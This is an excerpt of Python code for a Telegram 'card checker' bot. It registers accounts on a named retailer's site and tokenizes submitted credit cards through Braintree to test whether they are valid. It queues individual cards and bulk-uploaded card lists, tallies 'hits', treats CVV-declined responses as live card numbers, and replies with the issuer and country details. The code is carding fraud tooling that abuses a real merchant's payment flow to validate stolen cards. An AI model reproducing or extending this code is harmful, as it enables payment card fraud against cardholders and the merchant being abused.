...
async def check_cc(cc_details):
    logger.info(f"Starting check_cc for card: {cc_details}")
    ...
    try:
        async with aiohttp.ClientSession() as session:
            logger.info("Fetching bebebrands.com/my-account/")
            ...
            logger.info("Registering user on bebebrands.com")
            ...
            logger.info("Fetching billing address page")
            ...
            logger.info("Fetching add payment method page")
            ...
            logger.info("Fetching Braintree client token")
            ...
            logger.info("Tokenizing credit card with Braintree")
        ...
        logger.info(f"check_cc completed for card: {cc_details}, status: {result['status']}")
        return result
    except aiohttp.ClientError as e:
        logger.error(f"Error in check_cc for card {cc_details}: {e}")
        return {
            'card': full,
            'status': 'error',
            'message': str(e),
...
async def process_checks():
    logger.info("Starting process_checks loop")
    while True:
        if not check_queue.empty() and sum(1 for task in active_tasks.values() if not task.done()) < 3:
            logger.info(f"Processing queue, current size: {check_queue.qsize()}")
            user_id, cc_details, update, context = await check_queue.get()
            logger.info(f"Dequeued card for user {user_id}: {cc_details}")
            task = asyncio.create_task(single_check(user_id, cc_details, update, context))
            active_tasks[cc_details] = task
            await asyncio.sleep(70)
        else:
            logger.debug("Queue empty or max tasks reached, sleeping")
        await asyncio.sleep(1)

async def single_check(user_id, cc_details, update, context):
    logger.info(f"Starting single_check for user {user_id}, card: {cc_details}")
    user = await get_user(user_id)
    checking_msg = await update.message.reply_text("Checking Your Cc Please Wait..")
    result = await check_cc(cc_details)
    await checking_msg.delete()

    # Log the result dictionary for debugging
    logger.info(f"check_cc result: {result}")

    try:
        # Sanitize fields to avoid formatting issues
        card_type = str(result.get('card_type', 'Unknown'))
        card_level = str(result.get('card_level', 'Unknown'))
        card_type_category = str(result.get('card_type_category', 'Unknown'))
        issuer = str(result.get('issuer', 'Unknown'))
        country_name = str(result.get('country_name', 'Unknown'))
        country_flag = str(result.get('country_flag', '')) if result.get('country_flag') else ''
        time_taken = float(result.get('time_taken', 0.0))
        proxy_status = str(result.get('proxy_status', 'None'))
        card = str(result.get('card', cc_details))
        message = str(result.get('message', 'Unknown error'))
        status = str(result.get('status', 'error'))

        card_info = f"{card_type} {{ {card_level} }} {{ {card_type_category} }}"
        country_display = f"{country_name} {country_flag}" if country_flag else country_name
        ...
        if status == 'approved':
            ...
            msg = (f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n\n"
                   ...
                   f"[⌬]𝗖𝗵𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 -» {checked_by} {tier}\n"
                   f"[み]𝗕𝗼𝘁 -» <a href='tg://user?id=8009942983'>𝙁𝙉 𝘽3 𝘼𝙐𝙏𝙃</a>")
            if '2010: Card Issuer Declined CVV' in message:
                msg = msg.replace("𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌", "𝐂𝐂𝐍 ✅")

        logger.info(f"Sending response message: {msg}")
        await update.message.reply_text(msg, parse_mode='HTML')
        logger.info(f"Response message sent successfully for user {user_id}")

        if user:
            await update_user(user_id, {'checked': user.get('checked', 0) + 1})
        logger.info(f"Completed single_check for user {user_id}, card: {cc_details}, status: {status}")

    except Exception as e:
        logger.error(f"Error in single_check for user {user_id}, card: {cc_details}: {str(e)}")
        # Send a fallback message to the user
        fallback_msg = (f"⚠️ Check completed for card <code>{cc_details}</code>\n"
                       f"Status: {result.get('status', 'error')}\n"
                       f"However, an error occurred while sending the detailed response.\n"
                       f"Error: {str(e)}\n"
                       f"Please try again or contact support.")
        await update.message.reply_text(fallback_msg, parse_mode='HTML')
        logger.info(f"Fallback message sent for user {user_id}")
...
async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    logger.info(f"Received /chk command from user {user_id}")
    user = await get_user(user_id)
    ...
    logger.info(f"Added card to queue for user {user_id}: {cc_details}")
...
async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    for i, cc_details in enumerate(cc_list):
        ...
        if status == 'approved':
            approved += 1
            hits.append(card)
            last_response = result.get('message', 'Approved ✅')  # Store the real response
        ...
        elif status in ['declined', 'ccn']:
            declined += 1
            last_response = result.get('message', 'Unknown error')  # Store the real response
            if status == 'ccn':
                hits.append(card)
        ...
        keyboard = [
            ...
            [InlineKeyboardButton(f"Response💎: {last_response_display}", callback_data='view_response')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
...
def main():
    ...
    # Start the process_checks task after the application is running
    loop = asyncio.get_event_loop()
    loop.create_task(process_checks())
